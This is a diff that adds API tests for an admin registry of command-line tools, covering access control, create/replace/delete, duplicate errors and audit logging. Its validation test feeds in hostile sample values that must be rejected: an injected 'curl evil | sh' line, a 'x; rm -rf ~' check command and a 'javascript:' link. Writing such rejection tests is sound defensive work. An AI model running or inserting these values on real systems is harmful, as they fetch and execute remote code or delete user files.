@@ -402,3 +402,70 @@ test('PATCH /users/:id changes username and email, 409 on a clash, 400 when inva
   // Non-admins cannot rename anyone, themselves included.
   assert.equal((await t.req('PATCH', `${API}/users/${user.id}`, { headers: t.session(user), json: { username: 'self' } })).status, 403);
 });
+
+// ---------- CLI tools registry (f9j0) ----------
+
+test('cli-tools registry: 401 anonymous, 404 for non-admins and restricted admin keys, write scope for writes', async () => {
+  const { t, admin, ah, uh } = setup();
+  const restricted = t.key(admin, { groupIds: [insertGroup(t, admin)] }).headers;
+  const readOnly = t.key(admin, { scopes: ['read'] }).headers;
+  assert.equal((await t.req('POST', `${API}/admin/cli-tools`, { headers: ah, json: { name: 'kata' } })).status, 201);
+  const calls: [string, string, unknown?][] = [
+    ['GET', '/admin/cli-tools'],
+    ['POST', '/admin/cli-tools', { name: 'roborev' }],
+    ['PUT', '/admin/cli-tools/kata', { homepage: 'https://x.test' }],
+    ['DELETE', '/admin/cli-tools/kata', {}],
+  ];
+  for (const [method, path, json] of calls) {
+    assert.equal((await t.req(method, `${API}${path}`, { json })).status, 401, `${method} ${path} anon`);
+    assert.equal((await t.req(method, `${API}${path}`, { headers: uh, json })).status, 404, `${method} ${path} user`);
+    assert.equal((await t.req(method, `${API}${path}`, { headers: restricted, json })).status, 404, `${method} ${path} restricted key`);
+  }
+  assert.equal((await t.req('GET', `${API}/admin/cli-tools`, { headers: readOnly })).status, 200);
+  assert.equal((await t.req('POST', `${API}/admin/cli-tools`, { headers: readOnly, json: { name: 'roborev' } })).status, 403);
+  assert.deepEqual((t.db.prepare('SELECT name FROM cli_tools').all() as { name: string }[]).map((r) => r.name), ['kata'], 'a refused call wrote a row');
+});
+
+test('cli-tools registry: create, list, replace, delete; validation; 409; every change audited with its commands', async () => {
+  const { t, ah } = setup();
+  const list = async () => (await t.req('GET', `${API}/admin/cli-tools`, { headers: ah })).json.tools as { name: string }[];
+  assert.deepEqual(await list(), [], 'the registry starts empty');
+  const c = await t.req('POST', `${API}/admin/cli-tools`, {
+    headers: ah,
+    json: { name: 'roborev', homepage: 'https://roborev.dev', install: { macos: 'brew install roborev', linux: '', windows: 'scoop install roborev' } },
+  });
+  assert.equal(c.status, 201, c.text);
+  assert.deepEqual({ ...c.json.tool, updatedAt: undefined }, {
+    name: 'roborev',
+    homepage: 'https://roborev.dev',
+    check: 'roborev',
+    install: { macos: 'brew install roborev', windows: 'scoop install roborev' },
+    updatedAt: undefined,
+  });
+  assert.equal((await t.req('POST', `${API}/admin/cli-tools`, { headers: ah, json: { name: 'roborev' } })).json.error.code, 'tool_exists');
+  for (const bad of [
+    { name: 'Bad Name' },
+    { name: 'x', install: { macos: 'brew install x\ncurl evil | sh' } },
+    { name: 'x', install: { solaris: 'pkg install x' } },
+    { name: 'x', homepage: 'javascript:alert(1)' },
+    { name: 'x', check: 'x; rm -rf ~' },
+  ]) {
+    assert.equal((await t.req('POST', `${API}/admin/cli-tools`, { headers: ah, json: bad })).status, 400, JSON.stringify(bad));
+  }
+  const u = await t.req('PUT', `${API}/admin/cli-tools/roborev`, { headers: ah, json: { check: 'rr', install: { any: 'go install roborev@latest' } } });
+  assert.equal(u.status, 200, u.text);
+  assert.deepEqual([u.json.tool.homepage, u.json.tool.check, u.json.tool.install], ['', 'rr', { any: 'go install roborev@latest' }], 'PUT replaces every field');
+  assert.equal((await t.req('PUT', `${API}/admin/cli-tools/nope`, { headers: ah, json: {} })).status, 404);
+  assert.deepEqual((await list()).map((x) => x.name), ['roborev']);
+  assert.equal((await t.req('DELETE', `${API}/admin/cli-tools/roborev`, { headers: ah })).status, 204);
+  assert.equal((await t.req('DELETE', `${API}/admin/cli-tools/roborev`, { headers: ah })).status, 404);
+  assert.deepEqual(await list(), []);
+  const log = (t.db.prepare("SELECT action, target_type, target_id, detail FROM audit WHERE action LIKE 'cli_tool.%' ORDER BY id").all() as Record<string, string>[]).map(
+    (r) => [r.action, r.target_type, r.target_id, JSON.parse(r.detail)],
+  );
+  assert.deepEqual(log, [
+    ['cli_tool.create', 'cli_tool', 'roborev', { homepage: 'https://roborev.dev', check: 'roborev', install: { macos: 'brew install roborev', windows: 'scoop install roborev' } }],
+    ['cli_tool.update', 'cli_tool', 'roborev', { homepage: '', check: 'rr', install: { any: 'go install roborev@latest' } }],
+    ['cli_tool.delete', 'cli_tool', 'roborev', {}],
+  ]);
+});
